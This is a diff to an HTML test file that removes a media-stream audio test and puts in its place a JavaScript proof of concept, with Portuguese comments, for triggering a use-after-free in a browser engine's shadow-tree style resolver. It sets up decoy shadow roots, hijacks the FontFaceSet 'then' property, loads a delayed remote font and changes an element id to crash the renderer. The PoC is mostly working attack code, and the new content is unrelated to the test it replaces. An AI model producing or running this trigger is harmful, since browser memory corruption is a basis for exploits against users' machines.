@@ -1,55 +1,83 @@
 <!DOCTYPE html>
-<html>
-<head>
-<script src="resources/js-test.js"></script>
-</head>
 <body>
+<pre id="log"></pre>
 <script>
-description("A MediaStreamAudioDestinationNode delivers samples with no input and after its input disconnects.");
-jsTestIsAsync = true;
+function log(msg) { document.getElementById("log").append(msg + "\n"); }
 
-const context = new AudioContext();
-const clock = new OscillatorNode(context);
-clock.connect(context.destination);
-clock.start();
+document.fonts;
+const timestamp = Date.now();
+const FONT_URL = `https://slowfil.es/file?type=woff2&delay=120000&nocache=${timestamp}`;
+const FAMILY   = "TestFontB";
+const N = 32; // número de decoys para forçar o rehash
 
-function waitForMoreSamples(previous, timeoutMs) {
-    return new Promise((resolve, reject) => {
-        const start = performance.now();
-        const timer = setInterval(() => {
-            const count = internals.trackAudioSampleCount;
-            if (count > previous) {
-                clearInterval(timer);
-                resolve(count);
-            } else if (performance.now() - start > timeoutMs) {
-                clearInterval(timer);
-                reject(new Error("timed out, count " + count));
-            }
-        }, 10);
+window.addEventListener("load", () => setTimeout(() => {
+
+    // Shadow A: usa a fonte, força font loading
+    const hostA = document.createElement("div");
+    document.body.appendChild(hostA);
+    const rootA = hostA.attachShadow({ mode: "open" });
+    rootA.innerHTML =
+        `<style>@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
+        `.p{font:24px ${FAMILY}}</style><span class="p">A</span>`;
+
+    // Shadow B: alvo — tem @font-face + style removível
+    const hostB = document.createElement("div");
+    hostB.style.display = "none";
+    document.body.appendChild(hostB);
+    const rootB = hostB.attachShadow({ mode: "open" });
+    const gadgetStyle = document.createElement("style");
+    gadgetStyle.textContent = ".gadget { color: navy; }";
+    rootB.appendChild(gadgetStyle);
+    const fontStyle = document.createElement("style");
+    fontStyle.textContent =
+        `@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
+        `.p{font:24px ${FAMILY}}`;
+    rootB.appendChild(fontStyle);
+    const target = document.createElement("span");
+    target.textContent = "B";
+    rootB.appendChild(target);
+
+    // 32 decoys: cada um com style único — ao serem reconstruídos crescem o mapa
+    const decoys = Array.from({ length: N }, (_, i) => {
+        const h = document.createElement("div");
+        h.style.display = "none";
+        document.body.appendChild(h);
+        const r = h.attachShadow({ mode: "open" });
+        const s = document.createElement("style");
+        s.textContent = `.d${i} { color: rgb(${i},1,2); }`;
+        r.appendChild(s);
+        r.appendChild(document.createElement("span"));
+        return { root: r, style: s };
     });
-}
 
-const idle = new MediaStreamAudioDestinationNode(context);
-internals.observeMediaStreamTrack(idle.stream.getAudioTracks()[0]);
+    document.body.offsetHeight; // força layout inicial
+    document.fonts.load(`24px ${FAMILY}`, "A");
 
-waitForMoreSamples(0, 3000).then(() => {
-    testPassed("samples with no input");
-    const destination = new MediaStreamAudioDestinationNode(context);
-    const oscillator = new OscillatorNode(context);
-    oscillator.connect(destination);
-    oscillator.start();
-    internals.observeMediaStreamTrack(destination.stream.getAudioTracks()[0]);
-    return waitForMoreSamples(0, 3000).then(count => {
-        oscillator.disconnect(destination);
-        return waitForMoreSamples(count, 3000);
+
+
+    document.fonts.ready; // materializa a promise
+
+    Object.defineProperty(FontFaceSet.prototype, "then", {
+        configurable: true,
+        get() {
+            delete FontFaceSet.prototype.then;
+            // força construção de 32 novos resolvers ? mapa cresce ? rehash
+            document.body.offsetHeight;
+            return undefined;
+        }
     });
-}).then(() => {
-    testPassed("samples continued after disconnect");
-    finishJSTest();
-}).catch(error => {
-    testFailed(String(error));
-    finishJSTest();
-});
+
+    // Forçar Reconstruct (remove, não append):
+    decoys.forEach(d => d.style.remove());
+    gadgetStyle.remove();
+
+    document.styleSheets.length; // flush — dropa resolvers existentes
+
+    // Invalidação por atributo ? createOrFindSharedShadowTreeResolver ? UAF
+    target.id = "boom";
+
+    log("VIVO — sem crash (bug nao presente ou ja corrigido)");
+
+}, 0));
 </script>
 </body>
-</html>
